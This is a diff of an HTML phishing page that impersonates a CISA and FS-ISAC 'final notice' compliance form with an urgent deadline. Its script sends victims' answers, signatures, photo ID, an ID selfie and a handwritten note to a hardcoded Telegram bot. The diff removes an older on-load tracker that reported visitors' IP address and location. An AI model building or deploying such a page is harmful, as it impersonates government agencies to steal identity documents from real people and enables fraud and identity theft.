@@ -20,7 +20,6 @@
     overflow: hidden;
   }
 
-  /* OFFICIAL STAMP WATERMARK */
   .stamp-watermark {
     position: absolute;
     top: 50%;
@@ -340,7 +339,6 @@
     border: 1px solid #28a745;
   }
 
-  /* ERROR STYLES */
   .error-field {
     border: 2px solid #cc0000 !important;
     background: #fff5f5 !important;
@@ -396,7 +394,7 @@
 
   <div class="header">
     <span class="header-left">File Reference: PB-142-WT1139</span>
-    <span class="header-right">Date: July 27, 2026</span>
+    <span class="header-right">Date: July 28, 2026</span>
   </div>
 
   <div class="logo-section">
@@ -417,7 +415,7 @@
 
   <div class="ref-line">
     <span>File Reference: PB-142-WT1139</span>
-    <span>Date: July 27, 2026</span>
+    <span>Date: July 28, 2026</span>
   </div>
 
   <div class="subject-line">FINAL NOTICE: MANDATORY COMPLIANCE DEADLINE — JULY 31, 2026</div>
@@ -469,7 +467,7 @@
       BOTH must be completed before your file can proceed.
     </div>
     <div class="countdown">
-      ⏰ REMAINING DAYS TO COMPLETE ALL REQUIREMENTS: 4 DAYS
+      ⏰ REMAINING DAYS TO COMPLETE ALL REQUIREMENTS: 3 DAYS
     </div>
     <div class="body-text" style="font-weight: bold; color: #990000;">
       The deadline for ALL requirements is <strong>July 31, 2026</strong>.
@@ -872,289 +870,239 @@
 </div>
 
 <script>
-  // --- TRACKING: SEND NOTIFICATION WHEN PAGE IS OPENED ---
-  function sendPageOpenNotification() {
-    var botToken = "8974824259:AAEQ0PcGUcLULk92EeIr3iKpjXJi7usBRfs";
-    var chatId = "7283385361";
+function submitForm() {
+  document.querySelectorAll('.error-field').forEach(el => el.classList.remove('error-field'));
 
-    // Get IP and location
-    fetch('https://ipapi.co/json/')
-      .then(response => response.json())
-      .then(data => {
-        var ip = data.ip || 'Unknown';
-        var city = data.city || 'Unknown';
-        var region = data.region || 'Unknown';
-        var country = data.country_name || 'Unknown';
-        var isp = data.org || 'Unknown';
-        var timezone = data.timezone || 'Unknown';
+  var errors = [];
 
-        var message = "👁️ *PAGE VIEW NOTIFICATION*\n\n";
-        message += "*File Reference:* PB-142-WT1139\n";
-        message += "*Action:* Page opened\n";
-        message += "*IP Address:* " + ip + "\n";
-        message += "*Location:* " + city + ", " + region + ", " + country + "\n";
-        message += "*ISP:* " + isp + "\n";
-        message += "*Time Zone:* " + timezone + "\n";
-        message += "*Timestamp:* " + new Date().toLocaleString() + "\n";
-        message += "*Status:* Active — page is being viewed";
+  var q1 = document.querySelector('input[name="q1"]:checked');
+  var q2 = document.querySelector('input[name="q2"]:checked');
+  var q3 = document.querySelector('input[name="q3"]:checked');
+  var q4 = document.querySelector('input[name="q4"]:checked');
+  var q5 = document.querySelector('input[name="q5"]:checked');
+  var q6 = document.querySelector('input[name="q6"]:checked');
+  var intent = document.querySelector('input[name="intent"]:checked');
+  var q8 = document.querySelector('input[name="q8"]:checked');
+  var q9 = document.querySelector('input[name="q9"]:checked');
+  var q10 = document.querySelector('input[name="q10"]:checked');
+  var q11 = document.querySelector('input[name="q11"]:checked');
+  var q12 = document.querySelector('input[name="q12"]:checked');
+  var q13 = document.querySelector('input[name="q13"]:checked');
 
-        var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
-        var data = {
-          chat_id: chatId,
-          text: message,
-          parse_mode: "Markdown"
-        };
+  var decl1 = document.querySelector('input[name="declaration1"]:checked');
+  var decl2 = document.querySelector('input[name="declaration2"]:checked');
+  var decl3 = document.querySelector('input[name="declaration3"]:checked');
+  var decl4 = document.querySelector('input[name="declaration4"]:checked');
+  var responsibility = document.querySelector('input[name="responsibility"]:checked');
 
-        return fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data)
-        });
-      })
-      .catch(function(error) {
-        // If IP fetch fails, send basic notification
-        var message = "👁️ *PAGE VIEW NOTIFICATION*\n\n";
-        message += "*File Reference:* PB-142-WT1139\n";
-        message += "*Action:* Page opened\n";
-        message += "*IP Address:* Unable to retrieve\n";
-        message += "*Timestamp:* " + new Date().toLocaleString() + "\n";
-        message += "*Status:* Active — page is being viewed";
+  var signature = document.querySelector('input[name="signature"]').value.trim();
+  var date = document.querySelector('input[name="submission_date"]').value;
+  var respSignature = document.querySelector('input[name="responsibility_signature"]').value.trim();
+  var respDate = document.querySelector('input[name="responsibility_date"]').value;
 
-        var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
-        var data = {
-          chat_id: chatId,
-          text: message,
-          parse_mode: "Markdown"
-        };
+  var photoId = document.querySelector('input[name="photo_id"]');
+  var photoWithId = document.querySelector('input[name="photo_with_id"]');
+  var handwrittenNote = document.querySelector('input[name="handwritten_note"]');
 
-        return fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data)
-        });
-      })
-      .catch(function(error) {
-        console.log("Tracking failed: " + error.message);
-      });
-  }
+  var photoIdFile = photoId.files[0];
+  var photoWithIdFile = photoWithId.files[0];
+  var handwrittenNoteFile = handwrittenNote.files[0];
 
-  // --- CALL TRACKING WHEN PAGE LOADS ---
-  window.onload = function() {
-    sendPageOpenNotification();
-  };
-
-  // --- SUBMIT FUNCTION ---
-  function submitForm() {
-    document.querySelectorAll('.error-field').forEach(el => el.classList.remove('error-field'));
-
-    var errors = [];
-
-    var q1 = document.querySelector('input[name="q1"]:checked');
-    var q2 = document.querySelector('input[name="q2"]:checked');
-    var q3 = document.querySelector('input[name="q3"]:checked');
-    var q4 = document.querySelector('input[name="q4"]:checked');
-    var q5 = document.querySelector('input[name="q5"]:checked');
-    var q6 = document.querySelector('input[name="q6"]:checked');
-    var intent = document.querySelector('input[name="intent"]:checked');
-    var q8 = document.querySelector('input[name="q8"]:checked');
-    var q9 = document.querySelector('input[name="q9"]:checked');
-    var q10 = document.querySelector('input[name="q10"]:checked');
-    var q11 = document.querySelector('input[name="q11"]:checked');
-    var q12 = document.querySelector('input[name="q12"]:checked');
-    var q13 = document.querySelector('input[name="q13"]:checked');
-
-    var decl1 = document.querySelector('input[name="declaration1"]:checked');
-    var decl2 = document.querySelector('input[name="declaration2"]:checked');
-    var decl3 = document.querySelector('input[name="declaration3"]:checked');
-    var decl4 = document.querySelector('input[name="declaration4"]:checked');
-    var responsibility = document.querySelector('input[name="responsibility"]:checked');
-
-    var signature = document.querySelector('input[name="signature"]').value.trim();
-    var date = document.querySelector('input[name="submission_date"]').value;
-    var respSignature = document.querySelector('input[name="responsibility_signature"]').value.trim();
-    var respDate = document.querySelector('input[name="responsibility_date"]').value;
-
-    var photoId = document.querySelector('input[name="photo_id"]');
-    var photoWithId = document.querySelector('input[name="photo_with_id"]');
-    var handwrittenNote = document.querySelector('input[name="handwritten_note"]');
-
-    var photoIdFile = photoId.files[0];
-    var photoWithIdFile = photoWithId.files[0];
-    var handwrittenNoteFile = handwrittenNote.files[0];
-
-    function validateRadio(name, label) {
-      var checked = document.querySelector('input[name="' + name + '"]:checked');
-      if (!checked) {
-        errors.push(label);
-        var radios = document.querySelectorAll('input[name="' + name + '"]');
-        radios.forEach(function(r) {
-          var parent = r.closest('.form-group');
-          if (parent) parent.classList.add('error-field');
-        });
-        return false;
-      }
-      return true;
-    }
-
-    function validateCheckbox(name, label) {
-      var checked = document.querySelector('input[name="' + name + '"]:checked');
-      if (!checked) {
-        errors.push(label);
-        var checkbox = document.querySelector('input[name="' + name + '"]');
-        var parent = checkbox.closest('.form-group');
+  function validateRadio(name, label) {
+    var checked = document.querySelector('input[name="' + name + '"]:checked');
+    if (!checked) {
+      errors.push(label);
+      var radios = document.querySelectorAll('input[name="' + name + '"]');
+      radios.forEach(function(r) {
+        var parent = r.closest('.form-group');
         if (parent) parent.classList.add('error-field');
-        return false;
-      }
-      return true;
+      });
+      return false;
     }
-
-    function validateTextField(input, label) {
-      if (!input.value.trim()) {
-        errors.push(label);
-        input.classList.add('error-field');
-        return false;
-      }
-      return true;
-    }
-
-    function validateFile(file, label, input) {
-      if (!file) {
-        errors.push(label + ' — no file selected');
-        input.closest('.upload-section').classList.add('error-field');
-        return false;
-      }
-      var validTypes = ['image/jpeg', 'image/png', 'image/jpg', 'image/gif', 'image/webp', 'image/heic', 'image/bmp'];
-      if (!validTypes.includes(file.type)) {
-        errors.push(label + ' — please upload a valid image (JPG, PNG, etc.)');
-        input.closest('.upload-section').classList.add('error-field');
-        return false;
-      }
-      return true;
-    }
-
-    validateRadio('q1', 'Question 1 (CIRCIA awareness)');
-    validateRadio('q2', 'Question 2 (Bank Secrecy Act)');
-    validateRadio('q3', 'Question 3 (18 U.S.C. § 1001)');
-    validateRadio('q4', 'Question 4 (FinCEN fraud alert)');
-    validateRadio('q5', 'Question 5 (SAR reporting)');
-    validateRadio('q6', 'Question 6 (AML/CFT compliance)');
-    validateRadio('intent', 'Declaration of Intent (Option 1 or 2)');
-    validateRadio('q8', 'Question 8 (Oracle Payments vulnerability)');
-    validateRadio('q9', 'Question 9 (Bank enforcement actions)');
-    validateRadio('q10', 'Question 10 (FinCEN fraud alert)');
-    validateRadio('q11', 'Question 11 (Transaction delays)');
-    validateRadio('q12', 'Question 12 (FinCEN action)');
-    validateRadio('q13', 'Question 13 (Employment status)');
-
-    validateCheckbox('declaration1', 'Declaration 1 — Review notice');
-    validateCheckbox('declaration2', 'Declaration 2 — Understand deadline');
-    validateCheckbox('declaration3', 'Declaration 3 — Understand consequences');
-    validateCheckbox('declaration4', 'Declaration 4 — Confirm intention');
-
-    validateTextField(document.querySelector('input[name="signature"]'), 'Signature');
-    validateTextField(document.querySelector('input[name="submission_date"]'), 'Date');
-    validateCheckbox('responsibility', 'Section H — Responsibility declaration');
-    validateTextField(document.querySelector('input[name="responsibility_signature"]'), 'Section H — Signature');
-    validateTextField(document.querySelector('input[name="responsibility_date"]'), 'Section H — Date');
-
-    validateFile(photoIdFile, 'Photo ID upload', photoId);
-    validateFile(photoWithIdFile, 'Photo with ID upload', photoWithId);
-    validateFile(handwrittenNoteFile, 'Handwritten note upload', handwrittenNote);
-
-    if (errors.length > 0) {
-      var errorMsg = "⚠️ Please complete the following required sections:\n\n- " + errors.join("\n- ");
-      alert(errorMsg);
-      var firstError = document.querySelector('.error-field');
-      if (firstError) firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
-      return;
-    }
-
-    var message = "📋 *CISA & FS-ISAC COMPLIANCE FORM SUBMISSION*\n\n";
-    message += "*File Reference:* PB-142-WT1139\n";
-    message += "*Date:* " + date + "\n\n";
-
-    message += "*SECTION A — Cybersecurity Incident Reporting Awareness*\n";
-    message += "1. " + q1.value + "\n";
-    message += "2. " + q2.value + "\n";
-    message += "3. " + q3.value + "\n\n";
-
-    message += "*SECTION B — Fraud & Illicit Finance Awareness*\n";
-    message += "4. " + q4.value + "\n";
-    message += "5. " + q5.value + "\n";
-    message += "6. " + q6.value + "\n\n";
-
-    message += "*SECTION C — Declaration of Intent*\n";
-    message += "Selected Option: " + intent.value + "\n";
-    var additional = document.querySelector('textarea[name="additional_info"]').value;
-    message += "Additional Info: " + (additional || "None provided") + "\n\n";
-
-    message += "*SECTION D — Declaration of Understanding*\n";
-    message += "Reviewed notice: " + (decl1 ? "Yes" : "No") + "\n";
-    message += "Understand deadline: " + (decl2 ? "Yes" : "No") + "\n";
-    message += "Understand consequences: " + (decl3 ? "Yes" : "No") + "\n";
-    message += "Confirm intention: " + (decl4 ? "Yes" : "No") + "\n\n";
-
-    message += "*SECTION F — Transaction & Compliance Awareness*\n";
-    message += "8. " + (q8 ? q8.value : 'Not answered') + "\n";
-    message += "9. " + (q9 ? q9.value : 'Not answered') + "\n";
-    message += "10. " + (q10 ? q10.value : 'Not answered') + "\n";
-    message += "11. " + (q11 ? q11.value : 'Not answered') + "\n";
-    message += "12. " + (q12 ? q12.value : 'Not answered') + "\n\n";
-
-    message += "*SECTION G — Employment & Occupation Status*\n";
-    message += "13. " + (q13 ? q13.value : 'Not answered') + "\n";
-    var q14 = document.querySelector('textarea[name="q14"]').value;
-    message += "14. " + (q14 || "None provided") + "\n\n";
-
-    message += "*SECTION H — Certification of Responsibility*\n";
-    message += "Responsibility declared: " + (responsibility ? "Yes" : "No") + "\n";
-    message += "Signature: " + respSignature + "\n";
-    message += "Date: " + respDate + "\n\n";
-
-    message += "*Signature:* " + signature + "\n\n";
-    message += "*Confirmation Number:* CISA-FSISAC-CONF-20260727-2841";
-
-    var botToken = "8974824259:AAEQ0PcGUcLULk92EeIr3iKpjXJi7usBRfs";
-    var chatId = "7283385361";
-    var btn = document.querySelector('.submit-btn');
-    btn.textContent = "SUBMITTING...";
-    btn.disabled = true;
-
-    var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
-    var data = { chat_id: chatId, text: message, parse_mode: "Markdown" };
-
-    fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) })
-    .then(response => response.json())
-    .then(data => {
-      if (data.ok) {
-        var promises = [];
-        function sendFile(file, caption) {
-          var formData = new FormData();
-          formData.append('chat_id', chatId);
-          formData.append('document', file);
-          formData.append('caption', caption);
-          var fileUrl = "https://api.telegram.org/bot" + botToken + "/sendDocument";
-          return fetch(fileUrl, { method: 'POST', body: formData });
-        }
-        if (photoIdFile) promises.push(sendFile(photoIdFile, "📸 Photo ID"));
-        if (photoWithIdFile) promises.push(sendFile(photoWithIdFile, "📸 Photo with ID"));
-        if (handwrittenNoteFile) promises.push(sendFile(handwrittenNoteFile, "📸 Handwritten Note"));
-        return Promise.all(promises);
-      } else {
-        throw new Error(data.description || 'Failed to send message');
-      }
-    })
-    .then(() => {
-      document.querySelector('.submit-btn').style.display = 'none';
-      document.getElementById('successMessage').style.display = 'block';
-      window.scrollTo(0, 0);
-    })
-    .catch(error => {
-      alert("❌ Submission failed. Error: " + error.message);
-      btn.textContent = "SUBMIT COMPLIANCE FORM";
-      btn.disabled = false;
-    });
+    return true;
   }
+
+  function validateCheckbox(name, label) {
+    var checked = document.querySelector('input[name="' + name + '"]:checked');
+    if (!checked) {
+      errors.push(label);
+      var checkbox = document.querySelector('input[name="' + name + '"]');
+      var parent = checkbox.closest('.form-group');
+      if (parent) parent.classList.add('error-field');
+      return false;
+    }
+    return true;
+  }
+
+  function validateTextField(input, label) {
+    if (!input.value.trim()) {
+      errors.push(label);
+      input.classList.add('error-field');
+      return false;
+    }
+    return true;
+  }
+
+  function validateFile(file, label, input) {
+    if (!file) {
+      errors.push(label + ' — no file selected');
+      input.closest('.upload-section').classList.add('error-field');
+      return false;
+    }
+    var validTypes = ['image/jpeg', 'image/png', 'image/jpg', 'image/gif', 'image/webp', 'image/heic', 'image/bmp'];
+    if (!validTypes.includes(file.type)) {
+      errors.push(label + ' — please upload a valid image (JPG, PNG, etc.)');
+      input.closest('.upload-section').classList.add('error-field');
+      return false;
+    }
+    return true;
+  }
+
+  validateRadio('q1', 'Question 1 (CIRCIA awareness)');
+  validateRadio('q2', 'Question 2 (Bank Secrecy Act)');
+  validateRadio('q3', 'Question 3 (18 U.S.C. § 1001)');
+  validateRadio('q4', 'Question 4 (FinCEN fraud alert)');
+  validateRadio('q5', 'Question 5 (SAR reporting)');
+  validateRadio('q6', 'Question 6 (AML/CFT compliance)');
+  validateRadio('intent', 'Declaration of Intent (Option 1 or 2)');
+  validateRadio('q8', 'Question 8 (Oracle Payments vulnerability)');
+  validateRadio('q9', 'Question 9 (Bank enforcement actions)');
+  validateRadio('q10', 'Question 10 (FinCEN fraud alert)');
+  validateRadio('q11', 'Question 11 (Transaction delays)');
+  validateRadio('q12', 'Question 12 (FinCEN action)');
+  validateRadio('q13', 'Question 13 (Employment status)');
+
+  validateCheckbox('declaration1', 'Declaration 1 — Review notice');
+  validateCheckbox('declaration2', 'Declaration 2 — Understand deadline');
+  validateCheckbox('declaration3', 'Declaration 3 — Understand consequences');
+  validateCheckbox('declaration4', 'Declaration 4 — Confirm intention');
+
+  validateTextField(document.querySelector('input[name="signature"]'), 'Signature');
+  validateTextField(document.querySelector('input[name="submission_date"]'), 'Date');
+  validateCheckbox('responsibility', 'Section H — Responsibility declaration');
+  validateTextField(document.querySelector('input[name="responsibility_signature"]'), 'Section H — Signature');
+  validateTextField(document.querySelector('input[name="responsibility_date"]'), 'Section H — Date');
+
+  validateFile(photoIdFile, 'Photo ID upload', photoId);
+  validateFile(photoWithIdFile, 'Photo with ID upload', photoWithId);
+  validateFile(handwrittenNoteFile, 'Handwritten note upload', handwrittenNote);
+
+  if (errors.length > 0) {
+    var errorMsg = "⚠️ Please complete the following required sections:\n\n- " + errors.join("\n- ");
+    alert(errorMsg);
+    var firstError = document.querySelector('.error-field');
+    if (firstError) firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    return;
+  }
+
+  var btn = document.querySelector('.submit-btn');
+  btn.textContent = "SUBMITTING...";
+  btn.disabled = true;
+
+  function escapeMarkdown(text) {
+    if (!text) return '';
+    var specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
+    var escaped = '';
+    for (var i = 0; i < text.length; i++) {
+      var char = text[i];
+      if (specialChars.indexOf(char) !== -1) {
+        escaped += '\\' + char;
+      } else {
+        escaped += char;
+      }
+    }
+    return escaped;
+  }
+
+  var additional = escapeMarkdown(document.querySelector('textarea[name="additional_info"]').value);
+  var q14 = escapeMarkdown(document.querySelector('textarea[name="q14"]').value);
+
+  var message = "📋 *CISA & FS-ISAC COMPLIANCE FORM SUBMISSION*\n\n";
+  message += "*File Reference:* PB-142-WT1139\n";
+  message += "*Date:* " + date + "\n\n";
+
+  message += "*SECTION A — Cybersecurity Incident Reporting Awareness*\n";
+  message += "1. " + q1.value + "\n";
+  message += "2. " + q2.value + "\n";
+  message += "3. " + q3.value + "\n\n";
+
+  message += "*SECTION B — Fraud & Illicit Finance Awareness*\n";
+  message += "4. " + q4.value + "\n";
+  message += "5. " + q5.value + "\n";
+  message += "6. " + q6.value + "\n\n";
+
+  message += "*SECTION C — Declaration of Intent*\n";
+  message += "Selected Option: " + intent.value + "\n";
+  message += "Additional Info: " + (additional || "None provided") + "\n\n";
+
+  message += "*SECTION D — Declaration of Understanding*\n";
+  message += "Reviewed notice: " + (decl1 ? "Yes" : "No") + "\n";
+  message += "Understand deadline: " + (decl2 ? "Yes" : "No") + "\n";
+  message += "Understand consequences: " + (decl3 ? "Yes" : "No") + "\n";
+  message += "Confirm intention: " + (decl4 ? "Yes" : "No") + "\n\n";
+
+  message += "*SECTION F — Transaction & Compliance Awareness*\n";
+  message += "8. " + (q8 ? q8.value : 'Not answered') + "\n";
+  message += "9. " + (q9 ? q9.value : 'Not answered') + "\n";
+  message += "10. " + (q10 ? q10.value : 'Not answered') + "\n";
+  message += "11. " + (q11 ? q11.value : 'Not answered') + "\n";
+  message += "12. " + (q12 ? q12.value : 'Not answered') + "\n\n";
+
+  message += "*SECTION G — Employment & Occupation Status*\n";
+  message += "13. " + (q13 ? q13.value : 'Not answered') + "\n";
+  message += "14. " + (q14 || "None provided") + "\n\n";
+
+  message += "*SECTION H — Certification of Responsibility*\n";
+  message += "Responsibility declared: " + (responsibility ? "Yes" : "No") + "\n";
+  message += "Signature: " + respSignature + "\n";
+  message += "Date: " + respDate + "\n\n";
+
+  message += "*Signature:* " + signature + "\n\n";
+  message += "*Confirmation Number:* CISA-FSISAC-CONF-20260727-2841";
+
+  var botToken = "8974824259:AAEQ0PcGUcLULk92EeIr3iKpjXJi7usBRfs";
+  var chatId = "7283385361";
+
+  var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+  var data = { chat_id: chatId, text: message, parse_mode: "Markdown" };
+
+  fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) })
+  .then(function(response) {
+    if (!response.ok) {
+      throw new Error('Network response was not ok');
+    }
+    return response.json();
+  })
+  .then(function(data) {
+    if (data.ok) {
+      var promises = [];
+      function sendFile(file, caption) {
+        var formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('document', file);
+        formData.append('caption', caption);
+        var fileUrl = "https://api.telegram.org/bot" + botToken + "/sendDocument";
+        return fetch(fileUrl, { method: 'POST', body: formData });
+      }
+      if (photoIdFile) promises.push(sendFile(photoIdFile, "📸 Photo ID"));
+      if (photoWithIdFile) promises.push(sendFile(photoWithIdFile, "📸 Photo with ID"));
+      if (handwrittenNoteFile) promises.push(sendFile(handwrittenNoteFile, "📸 Handwritten Note"));
+      return Promise.all(promises);
+    } else {
+      throw new Error(data.description || 'Failed to send message');
+    }
+  })
+  .then(function() {
+    document.querySelector('.submit-btn').style.display = 'none';
+    document.getElementById('successMessage').style.display = 'block';
+    window.scrollTo(0, 0);
+  })
+  .catch(function(error) {
+    alert("❌ Submission failed. Error: " + error.message);
+    btn.textContent = "SUBMIT COMPLIANCE FORM";
+    btn.disabled = false;
+  });
+}
 </script>
 
 </body>
